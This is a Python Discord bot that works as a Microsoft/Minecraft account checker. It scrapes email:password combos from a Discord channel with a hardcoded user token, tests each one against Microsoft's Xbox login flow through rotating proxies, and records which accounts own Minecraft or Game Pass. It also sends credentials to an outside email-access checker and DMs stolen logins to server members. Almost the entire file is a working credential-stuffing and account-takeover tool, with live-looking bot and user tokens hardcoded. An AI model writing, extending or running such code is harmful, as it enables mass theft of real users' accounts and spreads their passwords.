import discord
from discord.ext import commands, tasks
import asyncio
import os
import re
import requests
import random
import urllib3
import json
import warnings
from datetime import datetime, timezone
import time
from colorama import Fore, init
from urllib.parse import urlparse, parse_qs
import threading
import concurrent.futures

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# --- ⚙️ الإعدادات الثابتة (Tokens Hardcoded) ---
DISCORD_BOT_TOKEN = "MTUzMzkyOTk1NjgwMjAzNTc5Mw.GmLAWq.IwlhZsJXGFtXkQYNkraG5twuUJvBDWSpdBR2KE"
USER_TOKEN = "MTQ0ODk4NDU1NTY1MzQzMTM1OQ.GTt5MJ.C7XwseDVj98cyqw7XqR_HJMaq2nIL06OCDyIr8"
ALLOWED_USERS = [1462575612085538828, 1130516001495208046]
SCRAPE_CHANNEL_ID = 1436351424999985162

ACCOUNTS_FILE = "combos.txt"
CONFIG_FILE = "config.json"
PREFIX = '$'

# --- ThunderMC Global Variables ---
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
banproxies = []
fname = "bot_results"
hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,xgp,xgpu,other = 0,0,0,0,0,0,0,0,0,0,0,5,0,0,0
screen = "2"

# --- Classes ---

class Config:
    def __init__(self):
        self.data = {
            'hypixelname': True, 'hypixellevel': True, 'hypixelfirstlogin': True, 
            'hypixellastlogin': True, 'hypixelbwstars': True, 'hypixelsbcoins': True,
            'optifinecape': True, 'mcapes': True, 'access': True, 'hypixelban': True,
            'namechange': True, 'lastchanged': True, 'payment': True, 'webhook': '', 'embed': False
        }
    def set(self, key, value): self.data[key] = value
    def get(self, key): return self.data.get(key)

config = Config()

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, session):
        self.email = email; self.password = password; self.name = name; self.capes = capes
        self.uuid = uuid; self.token = token; self.type = type; self.session = session
        self.hypixl = None; self.level = None; self.firstlogin = None; self.lastlogin = None
        self.cape = None; self.access = None; self.sbcoins = None; self.bwstars = None
        self.banned = None; self.namechanged = None; self.lastchanged = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixl != None: message+=f"\nHypixel: {self.hypixl}"
        if self.level != None: message+=f"\nHypixel Level: {self.level}"
        if self.firstlogin != None: message+=f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin != None: message+=f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape != None: message+=f"\nOptifine Cape: {self.cape}"
        if self.access != None: message+=f"\nEmail Access: {self.access}"
        if self.sbcoins != None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars != None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config.get('hypixelban') is True: message+=f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
        return message

    def handle(self, session):
        global hits, checked, cpm
        self.hypixel(); self.optifine(); self.full_access(); self.namechange()
        hits+=1; cpm+=1; checked+=1
        if screen == "2": print(Fore.GREEN+f"Hit: {self.email}:{self.password}")
        if not os.path.exists(f"results/{fname}"): os.makedirs(f"results/{fname}", exist_ok=True)
        # تنظيف نهائي عند الحفظ
        clean_email = self.email.strip().replace("'", "").replace('"', "").rstrip(',')
        clean_pass = self.password.strip().replace("'", "").replace('"', "").rstrip(',')
        open(f"results/{fname}/Hits.txt", 'a').write(f"{clean_email}:{clean_pass}\n")
        open(f"results/{fname}/Capture.txt", 'a', encoding='utf-8').write(self.builder()+"\n============================\n")

    def hypixel(self):
        global errors
        try:
            if config.get('hypixelname') or config.get('hypixellevel') or config.get('hypixelfirstlogin') or config.get('hypixellastlogin') or config.get('hypixelbwstars'):
                tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, proxies=getproxy(), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
                try: 
                    if config.get('hypixelname'): self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
                except: pass
                try: 
                    if config.get('hypixellevel'): self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelfirstlogin'): self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixellastlogin'): self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelbwstars'): self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass
            if config.get('hypixelsbcoins'):
                try:
                    req = requests.get("https://sky.shiiyu.moe/stats/"+self.name, proxies=getproxy(), verify=False)
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except: errors+=1

    def optifine(self):
        if config.get('optifinecape'):
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False).text
                if "Not found" in txt: self.cape = "No"
                else: self.cape = "Yes"
            except: self.cape = "Unknown"

    def full_access(self):
        if config.get('access'):
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text)
                if out["Success"] == 1: self.access = "True"
                else: self.access = "False"
            except: self.access = "Unknown"
    
    def namechange(self):
        if config.get('namechange') or config.get('lastchanged'):
            tries = 0
            while tries < maxretries:
                try:
                    check = self.session.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'})
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config.get('namechange'): self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            if config.get('lastchanged'):
                                created_at = data.get('createdAt')
                                if created_at:
                                    try: given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                    except ValueError: given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime("%m/%d/%Y")
                                    current_date = datetime.now(timezone.utc); difference = current_date - given_date
                                    years = difference.days // 365; months = (difference.days % 365) // 30; days = difference.days
                                    if years > 0: self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                    elif months > 0: self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                    else: self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                                    break
                        except: pass
                except: pass
                tries+=1

# --- Functions ---

def getproxy():
    if not proxylist: return None
    proxy = random.choice(proxylist)
    return {'http': 'http://'+proxy, 'https': 'http://'+proxy}

def get_urlPost_sFTTag(session):
    global retries
    while True:
        try:
            text = session.get(sFTTag_url, timeout=15).text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match: return match.group(1), sFTTag, session
        except: pass
        session.proxy = getproxy(); retries += 1; time.sleep(1)

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None": return token, session
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                twofa+=1; checked+=1; cpm+=1
                if screen == "2": print(Fore.MAGENTA+f"2FA: {email}:{password}")
                return "None", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times"]):
                bad+=1; checked+=1; cpm+=1
                if screen == "2": print(Fore.RED+f"Bad: {email}:{password}")
                return "None", session
            else: session.proxy = getproxy(); retries+=1; tries+=1
        except: session.proxy = getproxy(); retries+=1; tries+=1
    bad+=1; checked+=1; cpm+=1
    return "None", session

def checkownership(entitlements_response):
    items = entitlements_response.get("items", [])
    has_normal_minecraft = False; has_game_pass_pc = False; has_game_pass_ultimate = False
    for item in items:
        name = item.get("name", ""); source = item.get("source", "")
        if name in ("game_minecraft", "product_minecraft") and source in ("PURCHASE", "MC_PURCHASE"): has_normal_minecraft = True
        if name == "product_game_pass_pc": has_game_pass_pc = True
        if name == "product_game_pass_ultimate": has_game_pass_ultimate = True
    if has_normal_minecraft and has_game_pass_pc: return "Normal Minecraft (with Game Pass)"
    if has_normal_minecraft and has_game_pass_ultimate: return "Normal Minecraft (with Game Pass Ultimate)"
    elif has_normal_minecraft: return "Normal Minecraft"
    elif has_game_pass_ultimate: return "Xbox Game Pass Ultimate"
    elif has_game_pass_pc: return "Xbox Game Pass (PC)"
    return None

def capture_mc(access_token, session, email, password, type):
    while True:
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'})
            if r.status_code == 200:
                try:
                    capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
                    CAPTURE = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type, session)
                    CAPTURE.handle(session); break
                except: pass
            elif r.status_code == 429: time.sleep(5); continue
            else: break
        except: continue

def checkmc(session, email, password, token, xbox_token):
    global xgp, xgpu, other, cpm, checked
    while True:
        try:
            checkrq = session.get('https://api.minecraftservices.com/entitlements/license', headers={'Authorization': f'Bearer {token}'}, verify=False)
            if checkrq.status_code == 429: time.sleep(5); continue
            else: break
        except: continue
    if checkrq.status_code == 200:
        acctype = checkownership(checkrq.json())
        if acctype:
            if screen == "2": print(Fore.LIGHTGREEN_EX+f"{acctype}: {email}:{password}")
            if "Ultimate" in acctype: xgpu+=1
            elif "Game Pass" in acctype: xgp+=1
            capture_mc(token, session, email, password, acctype)
            return True
    return False

def mc_token(session, uhs, xsts_token):
    while True:
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429: time.sleep(5); continue
            else: return mc_login.json().get('access_token')
        except: continue

def validmail(email, password):
    global vm, cpm, checked
    vm+=1; cpm+=1; checked+=1
    if not os.path.exists(f"results/{fname}"): os.makedirs(f"results/{fname}", exist_ok=True)
    clean_email = email.strip().replace("'", "").replace('"', "").rstrip(',')
    clean_pass = password.strip().replace("'", "").replace('"', "").rstrip(',')
    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{clean_email}:{clean_pass}\n")

def authenticate(email, password, tries = 0):
    global bad, checked, cpm
    try:
        session = requests.Session(); session.verify = False; session.proxies = getproxy()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token != "None":
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json(); xbox_token = js.get('Token')
                uhs = js['DisplayClaims']['xui'][0]['uhs']
                xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xsts.json(); xsts_token = js.get('Token')
                if xsts_token != None:
                    access_token = mc_token(session, uhs, xsts_token)
                    if access_token != None: hit = checkmc(session, email, password, access_token, xbox_token)
            except: pass
            if hit == False: validmail(email, password)
            return hit
    except:
        if tries < maxretries: return authenticate(email, password, tries + 1)
        else:
            bad+=1; checked+=1; cpm+=1
            if screen == "2": print(Fore.RED+f"Bad: {email}:{password}")
            return False
    finally: session.close()
    return False

# --- Discord Bot Setup ---
intents = discord.Intents.default()
intents.message_content = True; intents.members = True; intents.presences = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# --- Bot Commands ---
@bot.event
async def on_ready(): print(f"{Fore.MAGENTA}Logged in as {bot.user.name}")

@bot.command(name='help')
async def help_cmd(ctx):
    if ctx.author.id not in ALLOWED_USERS: return
    embed = discord.Embed(title="🛠️ لوحة تحكم Sopra (بايثون المطور)", color=discord.Color.blue())
    embed.add_field(name="🔍 الفحص", value="`$فحص`: فحص الحسابات وتحديث الستوك.", inline=False)
    embed.add_field(name="📥 السحب", value="`$start`: سحب الحسابات.\n`$stock`: عرض الكمية.\n`$reset`: تفريغ الستوك.", inline=False)
    embed.add_field(name="📩 الإرسال", value="`$sent @user [عدد]`: إرسال لشخص.\n`$sent all [عدد]`: توزيع عشوائي للجميع.", inline=False)
    await ctx.send(embed=embed)

@bot.command(name='start')
async def start_scrape(ctx):
    if ctx.author.id not in ALLOWED_USERS: return
    status = await ctx.send(f"⏳ جاري السحب...")
    headers = {"Authorization": USER_TOKEN}; new_count = 0; accounts = []
    if os.path.exists(ACCOUNTS_FILE):
        with open(ACCOUNTS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            accounts = [line.strip() for line in f if line.strip()]
    last_id = None
    try:
        fetched = 0
        while fetched < 100:
            url = f"https://discord.com/api/v9/channels/{SCRAPE_CHANNEL_ID}/messages?limit=100"
            if last_id: url += f"&before={last_id}"
            res = requests.get(url, headers=headers)
            if res.status_code != 200: break
            msgs = res.json(); 
            if not msgs: break
            for m in msgs:
                content = m.get("content", "") + str(m.get("embeds", ""))
                content = content.replace("||", "")
                # تحسين regex وتجاهل الفواصل والرموز في نهاية كلمة المرور
                matches = re.findall(r"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}):([^\s,]+)", content)
                for email, password in matches:
                    # تنظيف كلمة المرور من أي فواصل أو علامات اقتباس أو مسافات
                    clean_email = email.strip().lower().replace("'", "").replace('"', "").rstrip(',')
                    clean_pass = password.strip().replace("'", "").replace('"', "").rstrip(',').rstrip('.')
                    entry = f"{clean_email}:{clean_pass}"
                    if entry not in accounts: accounts.append(entry); new_count += 1
            fetched += len(msgs); last_id = msgs[-1]["id"]
            await status.edit(content=f"⏳ جاري السحب... تم فحص {fetched} رسالة. أُضيف: {new_count}"); await asyncio.sleep(1)
        
        with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
            for item in accounts:
                f.write(f"{item}\n")
        await status.edit(content=f"✅ تم السحب! أُضيف {new_count} حساب جديد بصيغة نظيفة.")
    except Exception as e: await ctx.send(f"❌ خطأ: {str(e)}")

@bot.command(name='فحص')
async def check_cmd(ctx):
    if ctx.author.id not in ALLOWED_USERS: return
    if not os.path.exists(ACCOUNTS_FILE): return await ctx.send("❌ الستوك فارغ.")
    with open(ACCOUNTS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
        accounts = [line.strip() for line in f if line.strip()]
    if not accounts: return await ctx.send("❌ الستوك فارغ.")
    
    status = await ctx.send(f"⏳ بدء الفحص لـ {len(accounts)} حساب...")
    valid = []
    
    for i, acc in enumerate(accounts):
        try:
            email, password = acc.split(':', 1)
            ok = await asyncio.to_thread(authenticate, email, password)
            if ok: valid.append(acc)
        except: pass
        if (i+1) % 5 == 0 or (i+1) == len(accounts):
            await status.edit(content=f"⏳ جاري الفحص: ({i+1}/{len(accounts)}) | ✅ شغال: {len(valid)}")
        
    with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
        for item in valid:
            f.write(f"{item}\n")
    await ctx.send(f"✅ انتهى الفحص! تم تحديث combos.txt وبقي {len(valid)} حساب شغال فقط.")

@bot.command(name='stock')
async def stock_cmd(ctx):
    if ctx.author.id not in ALLOWED_USERS: return
    count = 0
    if os.path.exists(ACCOUNTS_FILE):
        with open(ACCOUNTS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            count = len([line for line in f if line.strip()])
    await ctx.send(f"الستوك الحالي: **{count}** حساب.")

@bot.command(name='reset')
async def reset_cmd(ctx):
    if ctx.author.id not in ALLOWED_USERS: return
    try:
        with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
            pass
        await ctx.send("✅ تم تفريغ ملف combos.txt بنجاح (الستوك الآن 0).")
    except Exception as e:
        await ctx.send(f"❌ فشل تفريغ الملف: {str(e)}")

@bot.command(name='sent')
async def sent_cmd(ctx, target: str, count: int = 1):
    if ctx.author.id not in ALLOWED_USERS: return
    if not os.path.exists(ACCOUNTS_FILE): return await ctx.send("❌ الستوك فارغ.")
    with open(ACCOUNTS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
        accounts = [line.strip() for line in f if line.strip()]
    if not accounts: return await ctx.send("❌ الستوك فارغ.")
    
    if target.lower() == 'all':
        await ctx.guild.chunk(); members = [m for m in ctx.guild.members if not m.bot and m.status != discord.Status.offline]
        status = await ctx.send(f"⏳ جاري الإرسال لـ {len(members)} عضو..."); success = 0
        for m in members:
            acc = random.choice(accounts); e, p = acc.split(':', 1)
            embed = discord.Embed(title="🎮 Account", description=f"من {ctx.guild.name}", color=discord.Color.gold())
            embed.add_field(name="Email", value=f"```{e}```", inline=False); embed.add_field(name="Pass", value=f"```{p}```", inline=False)
            try: await m.send(embed=embed); success += 1
            except: pass
            await asyncio.sleep(0.1)
        await status.edit(content=f"✅ انتهى الإرسال! وصلت لـ {success} عضو.")
    else:
        try:
            user = await commands.MemberConverter().convert(ctx, target); selected = random.sample(accounts, min(count, len(accounts)))
            for acc in selected:
                e, p = acc.split(':', 1); embed = discord.Embed(title="🎮 Account", color=discord.Color.gold())
                embed.add_field(name="Email", value=f"```{e}```", inline=False); embed.add_field(name="Pass", value=f"```{p}```", inline=False)
                await user.send(embed=embed)
            await ctx.send(f"✅ تم إرسال {len(selected)} حساب لـ {user.name}.")
        except: await ctx.send("❌ تعذر العثور على المستخدم.")

if __name__ == '__main__':
    bot.run(DISCORD_BOT_TOKEN)
